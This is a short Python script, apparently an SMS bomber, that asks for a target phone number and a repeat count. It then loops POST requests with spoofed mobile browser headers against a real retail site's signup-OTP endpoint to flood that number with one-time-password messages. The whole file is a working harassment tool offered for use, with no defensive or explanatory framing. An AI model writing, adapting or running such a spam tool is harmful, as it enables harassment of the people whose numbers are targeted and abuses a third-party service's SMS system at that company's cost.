import json
import requests
import os
import sys


def main():
	os.system('clear')
	os.system('figlet arxelmitty')
	banner='''
	[+]AUTHOR: Arxel Mitty
	[+]Youtube : Arxel Mitty
	'''
	print(banner)
	no = input(' target : ')
	jum = input('amount of spam : ')


	head = {
	"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/108.0.5359.52 Mobile/15E148 Safari/604.1",
	"Referer": "https://www.mapclub.com/en/user/signup",
	"Host": "cmsapi.mapclub.com",
	}


	dat = {
	'phone': no
	}

	for x in range (int(jum)):
		leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
		if 'error' in leosureo:
			print('failed to send ' + no)

		else:
			print('successfully sent ' + no)



main()